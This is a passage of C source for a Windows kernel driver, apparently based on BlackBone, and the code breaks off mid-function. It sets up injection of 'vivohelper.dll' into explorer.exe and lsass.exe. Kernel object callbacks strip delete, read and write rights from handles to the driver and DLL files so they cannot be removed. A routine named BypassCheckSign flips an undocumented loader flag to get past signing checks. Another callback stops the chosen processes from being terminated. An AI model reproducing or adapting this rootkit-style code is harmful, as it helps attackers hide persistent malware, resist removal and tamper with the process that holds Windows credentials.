#include "BlackBoneDrv.h"
#include "Remap.h"
#include "Loader.h"
#include "Utils.h"
#include <Ntstrsafe.h>
#include <ntddk.h>
#include <string.h>

#define DELAY_ONE_MICROSECOND (-10)
#define DELAY_ONE_MILLISECOND (DELAY_ONE_MICROSECOND*1000)
//#define TARGET_PNAME_1 "dllCaller.exe"
#define TARGET_PNAME_1 "explorer.exe"
#define TARGET_PNAME_2 "lsass.exe"
#define TARGET_DLL_FOR_INJECT L"C:\\Windows\\vivohelper.dll"
#define TARGET_SYS_TO_PROTECTED L"vivohelper.sys"
#define TARGET_DLL_TO_PROTECTED L"vivohelper.dll"
#define INJECT_SPLIT (4*2) // second(s) 21600s = 360m = 6h = quater 
#define HEART_BEAT_ADDRESS (0x1ff00)
#define INVALID_PID (-1)

#define _FILE_PROTECTION_WAY_1_
#define _PROCESS_PROTECTION_
#define _THREAD_INJECT_


#ifdef _FILE_PROTECTION_WAY_1_
/* file protection : first way */
#define DISTINCT_SAVEFILE_FROM_READ (0x0000009fL)
PVOID obHandle;
typedef struct _CALLBACK_ENTRY {
	LIST_ENTRY CallbackList;
	OB_OPERATION  Operations;
	ULONG Active;
	PVOID Handle;
	POBJECT_TYPE ObjectType;
	POB_PRE_OPERATION_CALLBACK  PreOperation;
	POB_POST_OPERATION_CALLBACK PostOperation;
	ULONG unknown;
} CALLBACK_ENTRY, *PCALLBACK_ENTRY;

/*typedef struct _OB_HANDLE {
USHORT Version;
USHORT OperationRegistrationCount;
PVOID RegistrationContext;
UNICODE_STRING Altitude;
CALLBACK_ENTRY entries[1]; // array of OperationRegistrationCount entries
} OB_HANDLE, *POB_HANDLE;*/

//STRUCT FOR WIN7X64
typedef struct _LDR_DATA                         // 24 elements, 0xE0 bytes (sizeof)
{
	/*0x000*/     struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)
	/*0x010*/     struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)
	/*0x020*/     struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)
	/*0x030*/     VOID*        DllBase;
	/*0x038*/     VOID*        EntryPoint;
	/*0x040*/     ULONG32      SizeOfImage;
	/*0x044*/     UINT8        _PADDING0_[0x4];
	/*0x048*/     struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)
	/*0x058*/     struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)
	/*0x068*/     ULONG32      Flags;
	/*0x06C*/     UINT16       LoadCount;
	/*0x06E*/     UINT16       TlsIndex;
	union                                                    // 2 elements, 0x10 bytes (sizeof)
	{
		/*0x070*/         struct _LIST_ENTRY HashLinks;                        // 2 elements, 0x10 bytes (sizeof)
		struct                                               // 2 elements, 0x10 bytes (sizeof)
		{
			/*0x070*/             VOID*        SectionPointer;
			/*0x078*/             ULONG32      CheckSum;
			/*0x07C*/             UINT8        _PADDING1_[0x4];
		};
	};
	union                                                    // 2 elements, 0x8 bytes (sizeof)
	{
		/*0x080*/         ULONG32      TimeDateStamp;
		/*0x080*/         VOID*        LoadedImports;
	};
	/*0x088*/     struct _ACTIVATION_CONTEXT* EntryPointActivationContext;
	/*0x090*/     VOID*        PatchInformation;
	/*0x098*/     struct _LIST_ENTRY ForwarderLinks;                       // 2 elements, 0x10 bytes (sizeof)
	/*0x0A8*/     struct _LIST_ENTRY ServiceTagLinks;                      // 2 elements, 0x10 bytes (sizeof)
	/*0x0B8*/     struct _LIST_ENTRY StaticLinks;                          // 2 elements, 0x10 bytes (sizeof)
	/*0x0C8*/     VOID*        ContextInformation;
	/*0x0D0*/     UINT64       OriginalBase;
	/*0x0D8*/     union _LARGE_INTEGER LoadTime;                           // 4 elements, 0x8 bytes (sizeof)
}LDR_DATA, *PLDR_DATA;

typedef struct _OBJECT_TYPE_INITIALIZER                                                                                                                                         // 25 elements, 0x70 bytes (sizeof)
{
	/*0x000*/     UINT16       Length;
	union                                                                                                                                                                       // 2 elements, 0x1 bytes (sizeof)
	{
		/*0x002*/         UINT8        ObjectTypeFlags;
		struct                                                                                                                                                                  // 7 elements, 0x1 bytes (sizeof)
		{
			/*0x002*/             UINT8        CaseInsensitive : 1;                                                                                                                                   // 0 BitPosition
			/*0x002*/             UINT8        UnnamedObjectsOnly : 1;                                                                                                                                // 1 BitPosition
			/*0x002*/             UINT8        UseDefaultObject : 1;                                                                                                                                  // 2 BitPosition
			/*0x002*/             UINT8        SecurityRequired : 1;                                                                                                                                  // 3 BitPosition
			/*0x002*/             UINT8        MaintainHandleCount : 1;                                                                                                                               // 4 BitPosition
			/*0x002*/             UINT8        MaintainTypeList : 1;                                                                                                                                  // 5 BitPosition
			/*0x002*/             UINT8        SupportsObjectCallbacks : 1;                                                                                                                           // 6 BitPosition
		};
	};
	/*0x004*/     ULONG32      ObjectTypeCode;
	/*0x008*/     ULONG32      InvalidAttributes;
	/*0x00C*/     struct _GENERIC_MAPPING GenericMapping;                                                                                                                                     // 4 elements, 0x10 bytes (sizeof)
	/*0x01C*/     ULONG32      ValidAccessMask;
	/*0x020*/     ULONG32      RetainAccess;
	/*0x024*/     enum _POOL_TYPE PoolType;
	/*0x028*/     ULONG32      DefaultPagedPoolCharge;
	/*0x02C*/     ULONG32      DefaultNonPagedPoolCharge;
	/*0x030*/     PVOID DumpProcedure;
	/*0x038*/     PVOID OpenProcedure;
	/*0x040*/     PVOID CloseProcedure;
	/*0x048*/     PVOID DeleteProcedure;
	/*0x050*/     PVOID ParseProcedure;
	/*0x058*/     PVOID SecurityProcedure;
	/*0x060*/     PVOID QueryNameProcedure;
	/*0x068*/     PVOID OkayToCloseProcedure;
}OBJECT_TYPE_INITIALIZER, *POBJECT_TYPE_INITIALIZER;

typedef struct _EX_PUSH_LOCK                 // 7 elements, 0x8 bytes (sizeof)
{
	union                                    // 3 elements, 0x8 bytes (sizeof)
	{
		struct                               // 5 elements, 0x8 bytes (sizeof)
		{
			/*0x000*/             UINT64       Locked : 1;         // 0 BitPosition
			/*0x000*/             UINT64       Waiting : 1;        // 1 BitPosition
			/*0x000*/             UINT64       Waking : 1;         // 2 BitPosition
			/*0x000*/             UINT64       MultipleShared : 1; // 3 BitPosition
			/*0x000*/             UINT64       Shared : 60;        // 4 BitPosition
		};
		/*0x000*/         UINT64       Value;
		/*0x000*/         VOID*        Ptr;
	};
}_EX_PUSH_LOCK;

typedef struct _MY_OBJECT_TYPE                   // 12 elements, 0xD0 bytes (sizeof)
{
	/*0x000*/     struct _LIST_ENTRY TypeList;              // 2 elements, 0x10 bytes (sizeof)
	/*0x010*/     struct _UNICODE_STRING Name;              // 3 elements, 0x10 bytes (sizeof)
	/*0x020*/     VOID*        DefaultObject;
	/*0x028*/     UINT8        Index;
	/*0x029*/     UINT8        _PADDING0_[0x3];
	/*0x02C*/     ULONG32      TotalNumberOfObjects;
	/*0x030*/     ULONG32      TotalNumberOfHandles;
	/*0x034*/     ULONG32      HighWaterNumberOfObjects;
	/*0x038*/     ULONG32      HighWaterNumberOfHandles;
	/*0x03C*/     UINT8        _PADDING1_[0x4];
	/*0x040*/     struct _OBJECT_TYPE_INITIALIZER TypeInfo; // 25 elements, 0x70 bytes (sizeof)
	/*0x0B0*/     struct _EX_PUSH_LOCK TypeLock;            // 7 elements, 0x8 bytes (sizeof)
	/*0x0B8*/     ULONG32      Key;
	/*0x0BC*/     UINT8        _PADDING2_[0x4];
	/*0x0C0*/     struct _LIST_ENTRY CallbackList;          // 2 elements, 0x10 bytes (sizeof)
}MY_OBJECT_TYPE, *PMY_OBJECT_TYPE;

OB_PREOP_CALLBACK_STATUS preCall(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION OperationInformation)
{
	UNICODE_STRING DosName;
	PFILE_OBJECT fileo = OperationInformation->Object;
	HANDLE CurrentProcessId = PsGetCurrentProcessId();
	UNREFERENCED_PARAMETER(RegistrationContext);
	if (OperationInformation->ObjectType != *IoFileObjectType)
		return OB_PREOP_SUCCESS;
	//过滤无效指针
	if (fileo->FileName.Buffer == NULL ||
		!MmIsAddressValid(fileo->FileName.Buffer) ||
		fileo->DeviceObject == NULL ||
		!MmIsAddressValid(fileo->DeviceObject))
		return OB_PREOP_SUCCESS;
	//过滤无效路径
	if (!_wcsicmp(fileo->FileName.Buffer, L"\\Endpoint") ||
		!_wcsicmp(fileo->FileName.Buffer, L"?") ||
		!_wcsicmp(fileo->FileName.Buffer, L"\\.\\.") ||
		!_wcsicmp(fileo->FileName.Buffer, L"\\"))
		return OB_PREOP_SUCCESS;
	WCHAR pTempBuf[512] = { 0 };
	WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
	if (fileo->FileName.MaximumLength > 512)
	{
		pNonPageBuf = ExAllocatePool(NonPagedPool, fileo->FileName.MaximumLength);
		pTemp = pNonPageBuf;
	}
	RtlCopyMemory(pTemp, fileo->FileName.Buffer, fileo->FileName.MaximumLength);
	//_wcsupr(pTemp);
	_wcslwr(pTemp);
	if (
		NULL != wcsstr(pTemp, TARGET_SYS_TO_PROTECTED) ||
		NULL != wcsstr(pTemp, TARGET_DLL_TO_PROTECTED)
		//wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_SYS_TO_PROTECTED) ||
		//wcsstr(_wcslwr(fileo->FileName.Buffer), TARGET_DLL_TO_PROTECTED)		
		)
	{
		if (NULL != pNonPageBuf)
			ExFreePool(pNonPageBuf);
		if (OperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
		{
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & DELETE) == DELETE) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~DELETE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & READ_CONTROL) == READ_CONTROL) {
				if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & DISTINCT_SAVEFILE_FROM_READ) == DISTINCT_SAVEFILE_FROM_READ) {
					OperationInformation->Parameters->CreateHandleInformation.DesiredAccess = 0;
				}
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & WRITE_DAC) == WRITE_DAC) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~WRITE_DAC;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & WRITE_OWNER) == WRITE_OWNER) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~WRITE_OWNER;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & SYNCHRONIZE) == SYNCHRONIZE) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~SYNCHRONIZE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & STANDARD_RIGHTS_REQUIRED) == STANDARD_RIGHTS_REQUIRED) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~STANDARD_RIGHTS_REQUIRED;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_READ) == GENERIC_READ) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_READ;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_WRITE) == GENERIC_WRITE) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_WRITE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_EXECUTE;
			}
			if ((OperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & GENERIC_ALL) == GENERIC_ALL) {
				OperationInformation->Parameters->CreateHandleInformation.DesiredAccess &= ~GENERIC_ALL;
			}
		}
		if (OperationInformation->Operation == OB_OPERATION_HANDLE_DUPLICATE)
		{
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & DELETE) == DELETE) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~DELETE;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & READ_CONTROL) == READ_CONTROL) {
				if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & DISTINCT_SAVEFILE_FROM_READ) == DISTINCT_SAVEFILE_FROM_READ) {
					OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess = 0;
				}
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & WRITE_DAC) == WRITE_DAC) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~WRITE_DAC;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & WRITE_OWNER) == WRITE_OWNER) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~WRITE_OWNER;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & SYNCHRONIZE) == SYNCHRONIZE) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~SYNCHRONIZE;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & STANDARD_RIGHTS_REQUIRED) == STANDARD_RIGHTS_REQUIRED) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~STANDARD_RIGHTS_REQUIRED;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_READ) == GENERIC_READ) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_READ;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_WRITE) == GENERIC_WRITE) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_WRITE;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_EXECUTE) == GENERIC_EXECUTE) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_EXECUTE;
			}
			if ((OperationInformation->Parameters->DuplicateHandleInformation.OriginalDesiredAccess & GENERIC_ALL) == GENERIC_ALL) {
				OperationInformation->Parameters->DuplicateHandleInformation.DesiredAccess &= ~GENERIC_ALL;
			}
		}
	}
	if (NULL != pNonPageBuf)
		ExFreePool(pNonPageBuf);
	RtlVolumeDeviceToDosName(fileo->DeviceObject, &DosName);
	return OB_PREOP_SUCCESS;
}

VOID EnableObType(POBJECT_TYPE ObjectType)
{
	PMY_OBJECT_TYPE myobtype = (PMY_OBJECT_TYPE)ObjectType;
	myobtype->TypeInfo.SupportsObjectCallbacks = 1;
}
/* file protection : first way ends */
#endif

#ifdef _FILE_PROTECTION_WAY_2_
/* file protection : second way */
#include <fltKernel.h>
#include <dontuse.h>
#include <suppress.h>
#include <ntddscsi.h>
#include <ntddk.h>
#pragma prefast(disable:__WARNING_ENCODE_MEMBER_FUNCTION_POINTER, "Not valid for kernel mode drivers")
NTSTATUS
NPUnload
(
	__in FLT_FILTER_UNLOAD_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
NPPreCreate
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
);

FLT_POSTOP_CALLBACK_STATUS
NPPostCreate
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
NPPreSetInformation
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
);

FLT_POSTOP_CALLBACK_STATUS
NPPostSetInformation
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
NPPreRead
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
);

FLT_POSTOP_CALLBACK_STATUS
NPPostRead
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
);

FLT_PREOP_CALLBACK_STATUS
NPPreWrite
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
);

FLT_POSTOP_CALLBACK_STATUS
NPPostWrite
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
);

//Assign text sections for each routine.
#ifdef ALLOC_PRAGMA
#pragma alloc_text(PAGE, NPUnload)
#pragma alloc_text(PAGE, NPPostCreate)
#pragma alloc_text(PAGE, NPPostSetInformation)
#pragma alloc_text(PAGE, NPPostRead)
#pragma alloc_text(PAGE, NPPostWrite)
#endif

//operation registration
const FLT_OPERATION_REGISTRATION Callbacks[] =
{
	{
		IRP_MJ_CREATE,
		0,
		NPPreCreate,
		NPPostCreate
	},
	{
		IRP_MJ_SET_INFORMATION,
		0,
		NPPreSetInformation,
		NPPostSetInformation
	},
	{
		IRP_MJ_READ,
		0,
		NPPreRead,
		NPPostRead
	},
	{
		IRP_MJ_WRITE,
		0,
		NPPreWrite,
		NPPostWrite
	},
	{
		IRP_MJ_OPERATION_END
	}
};

//This defines what we want to filter with FltMgr
const FLT_REGISTRATION FilterRegistration =
{
	sizeof(FLT_REGISTRATION),         //  Size
	FLT_REGISTRATION_VERSION,           //  Version
	0,                                  //  Flags
	NULL,                               //  Context
	Callbacks,                          //  Operation callbacks
	NPUnload,                           //  MiniFilterUnload
	NULL,								//  InstanceSetup
	NULL,								//  InstanceQueryTeardown
	NULL,								//  InstanceTeardownStart
	NULL,								//  InstanceTeardownComplete
	NULL,                               //  GenerateFileName
	NULL,                               //  GenerateDestinationFileName
	NULL                                //  NormalizeNameComponent
};

PFLT_FILTER g_pFilterHandle = NULL;
PFLT_PORT 	g_pServerPort = NULL;
PFLT_PORT 	g_pClientPort = NULL;

NTSTATUS NPUnload
(
	__in FLT_FILTER_UNLOAD_FLAGS Flags
)
{
	UNREFERENCED_PARAMETER(Flags);
	PAGED_CODE();
	FltUnregisterFilter(g_pFilterHandle);
	DbgPrint("[MiniFilter][DriverUnload]\n");
	return STATUS_SUCCESS;
}

FLT_POSTOP_CALLBACK_STATUS NPPostCreate
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
)
{
	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS NPPreCreate
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	{
		UCHAR MajorFunction = 0;
		ULONG Options = 0;
		PFLT_FILE_NAME_INFORMATION nameInfo;
		MajorFunction = Data->Iopb->MajorFunction;
		Options = Data->Iopb->Parameters.Create.Options;
		//如果是IRP_MJ_CREATE，且选项是FILE_DELETE_ON_CLOSE，并且能成功获得文件名信息
		if (IRP_MJ_CREATE == MajorFunction && FILE_DELETE_ON_CLOSE == Options &&
			NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
		{
			//如果解析文件信息成功
			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
			{
				WCHAR pTempBuf[512] = { 0 };
				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
				if (nameInfo->Name.MaximumLength > 512)
				{
					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
					pTemp = pNonPageBuf;
				}
				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
				DbgPrint("[MiniFilter][IRP_MJ_CREATE]%wZ", &nameInfo->Name);
				_wcsupr(pTemp);
				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
				{
					//DbgPrint( "\r\nIn NPPreCreate(), FilePath{%wZ} is forbided.", &nameInfo->Name );
					if (NULL != pNonPageBuf)
						ExFreePool(pNonPageBuf);
					FltReleaseFileNameInformation(nameInfo);
					return FLT_PREOP_COMPLETE;
				}
				if (NULL != pNonPageBuf)
					ExFreePool(pNonPageBuf);
			}
			FltReleaseFileNameInformation(nameInfo);
		}
	}
	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS NPPostSetInformation
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
)
{
	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS NPPreSetInformation
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	{
		UCHAR MajorFunction = 0;
		PFLT_FILE_NAME_INFORMATION nameInfo;
		MajorFunction = Data->Iopb->MajorFunction;
		//如果操作是IRP_MJ_SET_INFORMATION且成功获得文件名信息
		if (IRP_MJ_SET_INFORMATION == MajorFunction &&
			NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
		{
			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
			{
				WCHAR pTempBuf[512] = { 0 };
				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
				if (nameInfo->Name.MaximumLength > 512)
				{
					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
					pTemp = pNonPageBuf;
				}
				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
				DbgPrint("[MiniFilter][IRP_MJ_SET_INFORMATION]%wZ", &nameInfo->Name);
				_wcsupr(pTemp);
				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
				{
					//DbgPrint( "\r\nIn NPPreSetInformation(), FilePath{%wZ} is forbided.", &nameInfo->Name );
					if (NULL != pNonPageBuf)
						ExFreePool(pNonPageBuf);
					FltReleaseFileNameInformation(nameInfo);
					return FLT_PREOP_DISALLOW_FASTIO;
				}
				if (NULL != pNonPageBuf)
					ExFreePool(pNonPageBuf);
			}
			FltReleaseFileNameInformation(nameInfo);
		}
	}
	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS NPPostRead
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
)
{
	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS NPPreRead
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	{
		PFLT_FILE_NAME_INFORMATION nameInfo;
		//直接获得文件名并检查
		if (NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
		{
			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
			{
				WCHAR pTempBuf[512] = { 0 };
				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
				if (nameInfo->Name.MaximumLength > 512)
				{
					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
					pTemp = pNonPageBuf;
				}
				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
				DbgPrint("[MiniFilter][IRP_MJ_READ]%wZ", &nameInfo->Name);
				/*_wcsupr( pTemp );
				if( NULL != wcsstr( pTemp, L"README.TXT" ) )  // 检查是不是要保护的文件
				{
				//DbgPrint( "\r\nIn NPPreWrite(), FilePath{%wZ} is forbided.", &nameInfo->Name );
				if( NULL != pNonPageBuf )
				ExFreePool( pNonPageBuf );
				FltReleaseFileNameInformation( nameInfo );
				return FLT_PREOP_DISALLOW_FASTIO;
				}*/
				if (NULL != pNonPageBuf)
					ExFreePool(pNonPageBuf);
			}
			FltReleaseFileNameInformation(nameInfo);
		}
	}
	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}

FLT_POSTOP_CALLBACK_STATUS NPPostWrite
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__in_opt PVOID CompletionContext,
	__in FLT_POST_OPERATION_FLAGS Flags
)
{
	return FLT_POSTOP_FINISHED_PROCESSING;
}

FLT_PREOP_CALLBACK_STATUS NPPreWrite
(
	__inout PFLT_CALLBACK_DATA Data,
	__in PCFLT_RELATED_OBJECTS FltObjects,
	__deref_out_opt PVOID *CompletionContext
)
{
	UNREFERENCED_PARAMETER(FltObjects);
	UNREFERENCED_PARAMETER(CompletionContext);
	PAGED_CODE();
	{
		PFLT_FILE_NAME_INFORMATION nameInfo;
		//直接获得文件名并检查
		if (NT_SUCCESS(FltGetFileNameInformation(Data, FLT_FILE_NAME_NORMALIZED | FLT_FILE_NAME_QUERY_DEFAULT, &nameInfo)))
		{
			if (NT_SUCCESS(FltParseFileNameInformation(nameInfo)))
			{
				WCHAR pTempBuf[512] = { 0 };
				WCHAR *pNonPageBuf = NULL, *pTemp = pTempBuf;
				if (nameInfo->Name.MaximumLength > 512)
				{
					pNonPageBuf = ExAllocatePool(NonPagedPool, nameInfo->Name.MaximumLength);
					pTemp = pNonPageBuf;
				}
				RtlCopyMemory(pTemp, nameInfo->Name.Buffer, nameInfo->Name.MaximumLength);
				DbgPrint("[MiniFilter][IRP_MJ_WRITE]%wZ", &nameInfo->Name);
				_wcsupr(pTemp);
				if (NULL != wcsstr(pTemp, L"README.TXT"))  // 检查是不是要保护的文件
				{
					//DbgPrint( "\r\nIn NPPreWrite(), FilePath{%wZ} is forbided.", &nameInfo->Name );
					if (NULL != pNonPageBuf)
						ExFreePool(pNonPageBuf);
					FltReleaseFileNameInformation(nameInfo);
					return FLT_PREOP_DISALLOW_FASTIO;
				}
				if (NULL != pNonPageBuf)
					ExFreePool(pNonPageBuf);
			}
			FltReleaseFileNameInformation(nameInfo);
		}
	}
	return FLT_PREOP_SUCCESS_NO_CALLBACK;
}
/* file protection : second way ends */
#endif

#ifdef _PROCESS_PROTECTION_
/* process protection */
NTKERNELAPI PEPROCESS IoThreadToProcess(PETHREAD Thread);
NTKERNELAPI char* PsGetProcessImageFileName(PEPROCESS Process);

void BypassCheckSign(PDRIVER_OBJECT pDriverObj)
{
	//STRUCT FOR WIN64
	typedef struct _LDR_DATA                         			// 24 elements, 0xE0 bytes (sizeof)
	{
		struct _LIST_ENTRY InLoadOrderLinks;                     // 2 elements, 0x10 bytes (sizeof)
		struct _LIST_ENTRY InMemoryOrderLinks;                   // 2 elements, 0x10 bytes (sizeof)
		struct _LIST_ENTRY InInitializationOrderLinks;           // 2 elements, 0x10 bytes (sizeof)
		VOID*        DllBase;
		VOID*        EntryPoint;
		ULONG32      SizeOfImage;
		UINT8        _PADDING0_[0x4];
		struct _UNICODE_STRING FullDllName;                      // 3 elements, 0x10 bytes (sizeof)
		struct _UNICODE_STRING BaseDllName;                      // 3 elements, 0x10 bytes (sizeof)
		ULONG32      Flags;
	}LDR_DATA, *PLDR_DATA;
	PLDR_DATA ldr;
	ldr = (PLDR_DATA)(pDriverObj->DriverSection);
	ldr->Flags |= 0x20;
}

BOOLEAN IsProtectedProcessName(PEPROCESS eprocess)
{
	char *Name = PsGetProcessImageFileName(eprocess);
	if (
		(!_stricmp(TARGET_PNAME_1, Name)) ||
		(!_stricmp(TARGET_PNAME_2, Name))
		)
		return TRUE;
	else
		return FALSE;
}

PVOID obHandle1 = NULL, obHandle2 = NULL;

OB_PREOP_CALLBACK_STATUS preCall1(PVOID RegistrationContext, POB_PRE_OPERATION_INFORMATION pOperationInformation)
{
#define PROCESS_TERMINATE 0x1
	HANDLE pid;
	if (pOperationInformation->ObjectType != *PsProcessType)
		goto exit_sub;
	pid = PsGetProcessId((PEPROCESS)pOperationInformation->Object);
	UNREFERENCED_PARAMETER(RegistrationContext);
	if (IsProtectedProcessName((PEPROCESS)pOperationInformation->Object))
	{
		if (pOperationInformation->Operation == OB_OPERATION_HANDLE_CREATE)
		{
			//pOperationInformation->Parameters->CreateHandleInformation.DesiredAccess=0;
			if ((pOperationInformation->Parameters->CreateHandleInformation.OriginalDesiredAccess & PROCESS_TERMINATE) == PROCESS_TERMINATE)
			{
